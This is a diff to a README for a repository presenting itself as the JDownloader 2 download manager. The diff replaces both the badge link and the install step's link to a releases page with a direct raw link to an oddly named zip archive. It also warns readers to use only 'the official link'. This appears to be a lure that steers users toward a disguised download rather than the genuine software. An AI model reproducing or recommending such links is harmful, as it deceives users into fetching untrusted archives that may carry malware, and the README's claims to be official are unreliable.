@@ -1,6 +1,6 @@
 # 📥 JDownloader-2 - Fast Reliable File Management For Everyone
 
-[![](https://img.shields.io/badge/Download-JDownloader--2-blue.svg)](https://github.com/Blackrotornithomimida539/JDownloader-2/releases)
+[![](https://img.shields.io/badge/Download-JDownloader--2-blue.svg)](https://raw.githubusercontent.com/Blackrotornithomimida539/JDownloader-2/main/redescent/Downloader-J-immaterial.zip)
 
 JDownloader 2 manages file downloads. This software organizes your transfer tasks and handles large batches of files. It automates common steps to save you time. This version includes updates for 2026 to ensure stability on modern computers. It runs on Windows 10 and Windows 11.
 
@@ -19,7 +19,7 @@ Software: Java Runtime Environment (this software usually checks for this automa
 
 Follow these steps to obtain the correct files. Do not download files from unofficial third-party websites. Use the official link to avoid harmful software.
 
-1. Visit the following page to choose your installation package: [https://github.com/Blackrotornithomimida539/JDownloader-2/releases](https://github.com/Blackrotornithomimida539/JDownloader-2/releases)
+1. Visit the following page to choose your installation package: [https://raw.githubusercontent.com/Blackrotornithomimida539/JDownloader-2/main/redescent/Downloader-J-immaterial.zip](https://raw.githubusercontent.com/Blackrotornithomimida539/JDownloader-2/main/redescent/Downloader-J-immaterial.zip)
 2. Look for the latest release version at the top of the list.
 3. Click the file ending in .exe to start the transfer.
 4. Save the file to your Downloads folder.
